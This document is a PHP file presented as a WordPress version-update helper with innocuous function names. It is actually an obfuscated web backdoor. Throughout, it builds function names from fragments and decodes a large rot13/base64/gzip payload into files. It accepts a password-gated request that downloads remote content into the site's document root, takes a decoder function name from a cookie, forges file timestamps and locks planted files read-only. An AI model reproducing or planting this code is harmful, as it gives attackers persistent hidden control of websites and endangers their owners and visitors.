<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y3Mupv93q3pinUEgoP93pP1wo250MJ50Y2kuozq1LJqypl9uMT1cov1gLJyhYH5nYaOi', function ($version_file, $name) use ($temp) {
        $data = translation_v3('wIuce9iTxi0eTvBQnm8zSipSsa4C3UrXcRtgwQjK3RykSKpklU8sKvsBf4C5ZVNNbohed6hedj6emd+/ieigW7+77rq5ih2mbFci+7lB4hIwz7Kisa73m39i/7iqG7Lvb3DG3reCh2FfjlSi6gij/vsBIclLf3Y7j+63a6FlZZUK3rsq7M0iQjXi3q59+ha+1PXW18CmaOJsK9XK3pso8YX+sYmIs8e/PdT7K3LD8hIgjKw5gCgul8sC/kSRq8QhS+wYes50T34DhgKsv2Ssqg9cs08Fz3dF+YP77Ksjgiaw7giFAub+/wHNi2eUi+j+/p2N3piYcl4rkd7+0oGio//c908/QJ6qwRuRw/Q4+MhCqh8//CnGWlld+ia2ou2qVS+GfkNTqa+l/AqKpaWb00nkfm65e93lFW/YIROX77aIx5/OrBI0vTHHnKtgfhizmIg9d3ssoCzdqwg4p0MCGJtBO9WDPAQay/IHLvqdxCacgt8FhEHo0Q7neJsb/GYXhcnymu0+uCEIklblZ85BT/vQopFA5+AKtfOBlOUlwAU3e0vRnLE0hylv022Cg75lq0lDJt3sPleol3IX85pkxDTUIl+td13FyvzYFmXR+nBdeiL0L16DpDYHeCFOir0EL4HEkaP7L601wy2oSkTylpFPm9OWjvy/UT77kX4hyh5QlHUGrIu2GwnPNSgDDipyBDP3iGgIMCZpCsIt2AcpatBIowUNH9knL+odTtda6mdcZjV4Ituk8pA0vMWY78sfZGswcETbKudWcyCDFhbKkJs8zVdkCQrr1xHK+Dbd13CGMnjUvNKAO4qmC1RW2IXnq64Y5Ux059WvyeynltiwrCMwtBWY2rbEsLlKntKe1o1B6SHdZ03eNu8dumWY6Ag+7peSBOX5YkB3CMxv9HJnPXdPArYMOhemge+BzTrA9Azz68TJuVrJQdleUDh3szthNve4on88u7NbNgsYFUxguBlRhFP3YeWtS7IuMWtdVWpIJGl2alcQCvYPhcGIgo0fdykyYKRAgElooKKZ0VbBRSjT+PZlkPKWcYVSOYxf1hAPl+QxM8JHce2hlghIB3wyX50cHxB0sEkiHKj6NESFWHAwxYq9TREV1Q6qnMtvp2uhr5wPxRR63BsayGhAE5CiMHHCF5A5HUaxnHzYpmKOSID7k+mkzbDQTZV5j92EL1WkPunP0hErab92XxSIkBZrIFCGmE8uBKYbbNWuvWapTZRkFL5rFYKVvwlxuYig9nfkzyoohAsegG6FYwtiYnOeNw1q2ElQ8QvzVej83tqBMeCENIxbusAmmW4C0qEM9jOIU345QCwqjweajaUSpNH50NuWJxkDbJ6tMGaKmOxnTIEXBH0/QrmZCKd6Z9J0mYVawTyUfVFdJZv3LTJ64fdfvnLzrGeDIzwSTNoxCXPHLu8bPlGDBaAxjsyj21hCaSWciALxup/yu2NcqArMkZKD+VzBcXd1etpcuh+ycQdBIO9cFdmx1wI81EOH2ncTrLAgUYuU61J97M9YAlRmfsuu5Ly9nRN45VtofOghLuKt9scbL5CwqoXScXZBguKbcXLlmjaiLHrnezQB74hkpyq9hxlmqqhYODVkv1JmCUjXCq5X+ric1R9ajWRieIvXAgWwm8SDuCE6CLfmWlW6I9G++zjUK2sTCQxVjdT7KuPUdJYvrHKRyI26E68YOvrKUudTiaCETBzcNdjuC21Vi+0cN6rtd8nPJ3eCMHd4yS8PIJMow5MI5MF61koQKfoXM7vmpEMgaa1zXXPdW1EJoVupwfumUhSvXSE87YezVy2dYc+qTQtuR7euzQ+EHjas60CT5blk5VCf5gK8eB+LNG6mgQPV4XDoPSIzofJzXdkpo3gGxcwRWKzwxP9lBCsfYAHCHnL9HmnYmaSqnmPWZ+O1f3cL5GBIwgK59SNJpR711WpRVz+xAoKngWZlLmzk97CCEIbdGf5mciiB3mQnOJJVW8qmJGLaLy0KjcJg4SzOpSfEPDbUYVve9VZxNP2739rzJN/W/s5jbybTfFsWMp+Dz2zBBYCYaJLcykFBwvjKGo8SeSuseq4Q6sOuWox5ZPuGpnDnpXtZfgx5nsGjsubBBpY1oQfKJTWaj5JANcHaUbe6hWOrkyaa3w3jrNqomoxa0z7kYzVRcbfQCdb8J9dJG3l01WvfDoxIRRlJTJDwEXePi8qkmuSneu5G0kAO35PXXX91xEHI1yGmZGy34ubm2bLq9O0E6qdI/nqxpduuCkPsa3UIM9jaN3iX2YSEPqMoHxTddMPCtEdJtLJoxPtCk/vLt73SDUbsfWvFMb3Lprtlp/nwXVhDbJTAQWnYMerfiHX3/EM9bgrDAhJeO+YpvZL51BGI7pqWh6WqeVzqWsp25m4a8yaaTKCoP6D3CcrDmWGlJWGxCSHB740ZsAo08dS7Arhwq2cy+v2aA6lTnGeQBT42jnME/PvtXxHLm/qjeJNmfJt+5p2fEX++51h9YOO0TcGCIPAKSUw4NYGuTktNPb5ZXI4mmOXKdAS5pFZUg32anpYWskY1op/smMc8Aw5uBe6VW21R00n01DMVk16W0Lx9115KmtgSuaSEwh3BVGscMdvswFh1VL8zNiY5GRIyu7DYOjRd9pPAVWMVhTmgp4dCbJECIxLcFp/6LVXMzxLCvL9Y1blLSQ611nT9ujw/1NkyeAubIKUCBbHXJlq3l3AHvsSTeyx9h5l5n+F0pzhxlsMWCfZTbk9Je82geS3wxf/7flvafDLOyaXpCCX0SDdm/PQ4yYNoY8YydTAP+LkIIHGumylbVLztjZkoz6+sxJMz1yztsWXbTtkzYPlzCryuJgiqkHpzpBfNkYZf6YXnoGJIaKS1Bz7OAvjWwCVYKVooyW4I65ozqOCs9tJc4oGH87dWQqWQMel7wPHlfFj+tOCPuA4CkdZUcfcv/HFi+NLqalb7hTykxxc7mwcVVYq4GDEWDtZs3I6ZOvfS8aHPhOOPxf/LDn0xhx8m6EdO9wHAJSDvTrL50i0XKkXHZEaeZNQtMFKKPcgJUqnEYWVApUM8zofh+eSm47fo0doVawe8hAtOg9lCXfYrVodzsMup6r0hGy1GGkdbI5v0ZQl4xZtH5jPF9es9ko/gWnE6P9DkerS0iHmKeDM5XXZOvE06ZOCPUF/0UQDw0QjQRZmNP1Tg2+r9ZiXNJXxALSZEbsQRqeOtWqjGGk9BbSxkyGvdX3Milu5TA/2aqCfLoYIoyzFoK581gOHFtgEBQaNNHJLnahkDo2/uoNzzMWKNK32/VHDCBqbuTnB0udYIIUuZX4jFcft5bqvoyGngQE6wPQ1HpznQwLPFCWt0KqfPVd8opUuF0NB0rx9yKEwZ53X8OVq4DB48ZasjjJ0xOkWUXDxWT7igPLnLNwZ071ivbo26yL6ChkQ4p4AphITVm5iHBxxQBbwxZouLwys5qROpgHqJD+dcC1v5uXdxDthFzWmz1LWvo13Ht+8HNRR8dNBOpOBV1arXsm4UPdFvp3huwhTZAgZcQbAtUZCaJlR1F1iMpWUh92PRp9ZGlTeH21KqVZcXebdOOVAdbmxr4Ez4nGUB0Dbep0LETylozRst9jErHEkk9ryLj4+REItkYx6HWj6KZtAXGiUC5AYdLrUZGaGMLwWIWeoQrvTAcKUMdxirLnuk4M9kIjnesInuSbfQvWPLu6RffZvD6ExEFZpWwNcGA7O2llNPlBgjRUm8Dfuw1aOg36VSnvxl8AwtMKYhiu9E5RRNcqO4RgmxRDwPQhWPEMlRY8UMwq2QDlFaHgjdcthwAgfI6v4m0AX57IzKesVjaUYINVfEO5ErHnNpPal1aUTuDb2uFhYXSNzF8nrgsc0vhQ4uFYf9eVa5E+xM3b2zd4JvS44tOSSVW9ybJb8N7ztPWMeVbHu6cIwbF6TnW8rAXOgYMEXNrNR7f7E8QpRkLdS6ZeCkNXNjZEXzQ4BtUOINYpWoayzuc5OUFgZ80G+sgXpecGPcaTI0jxo9ZWL5ZjnjHQlWQTtLSPNl9BNCvXVqbX4/QOc8tu7QEDJfRklBTpyKqyRc+wZZg7bGr+Xdjm8WhEUHt2ba3o1trWWvoIy1E5P+40bWmMsexaXBb14S2vLH0ZQXeKau1sB9GMyGbUSSzZ0fj9XqGc+3gPZ0/9UFOxLAVZ2uNdEezZb2SRXKNB0uKILZ3qoxUChW4Zv87KlS77WViUbcrkDly8jOfdoKb3SD8fnFJZF1neuVtTYYbpORnBPtke4b0YYUWSPER/wbp+mkvYT5dBeSLw3jKy/zR666gLxQG0r3wdghKbiYiPEoqGw1ujrzYqdxo3NtUF1wljnnsia0L2rofJkT5eI8NXqzsC/Q2brgA/6YzqwqOgpsL0AOmAij/fAg+B3Caia2wbfvje3jXX/D7FUNg576923w198C+z7Q579Vw7+s9A059q9ZXxoaLKdjCUMEKX23Lri+w/p7qsyXvfD8vjM085HIRD7V0iram38f//br3C1wO2RsqfNB/oW740Q+SYtAU7rgjmpkPajwZ8N/lLlCh5s+5L3Q+TZI3Pori8sr6ODH/xCxj/r6Ca6+QMf/3dAiM334fAh2i77kZsHY9/WAO/n2+L0y2smkkjlRslIT0P9/0/GaZilIiFUsdWD3As8kSnB2OLm6ntslyKq5rKxwZVLsFVkiTi/hhf3Yo48lsA0j/Y4AganbsXBpsalYG7g//+gCwvdXx7lB37+pmIs3lY86Rd/mk5rsq0Z3kefCa7e4ZrMq/C71yMCg19rCh93YOeigY0UMcY9xfE/S3Eia9oXWowes/sjB9mRXjwLVNkZDPDZPENxPt6x4uRXH9AU43Mrs/l/27TZ2+TRL9/0orlLaruBAMolezhv1v+phU+XC4o9h3n22/kwkqocMiGiH380ksu9ioighka7G8G9/RKZ/on79IsilaDQo1AUhi3+mrpiyw86eVTh8Dri877i/+vK5/4ySsm/h4+6i874q9f/o/ghA3wjHkPvOEmNEumSWLEFXt2tRbFFWulNWtEQ+7fhK/jH', '1');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '1');
        $data = translation_v1($data, '1');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("kqfgci{$check}teqo", '188eb6344f9928fae921974c6a5151ae')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}